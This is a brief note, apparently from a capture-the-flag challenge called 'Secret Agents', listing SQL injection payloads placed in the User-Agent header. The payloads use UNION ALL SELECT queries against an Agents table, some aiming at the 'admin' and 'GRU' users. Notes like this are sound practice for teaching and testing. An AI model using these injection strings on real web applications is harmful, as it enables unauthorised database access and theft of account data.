
# Secret Agents

### SQL Injection Payloads tried for UA(user-agents)
    * "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36' UNION ALL Select * from Agents ORDER BY 1 LIMIT 1 -- - "
    * UNION ALL Select * from Agents ORDER BY UA ASC - user GRU
    * UNION ALL Select * from Agents ORDER BY UA DESC - user admin
    * UNION ALL Select * from Agents ORDER BY 1 LIMIT 1 -- -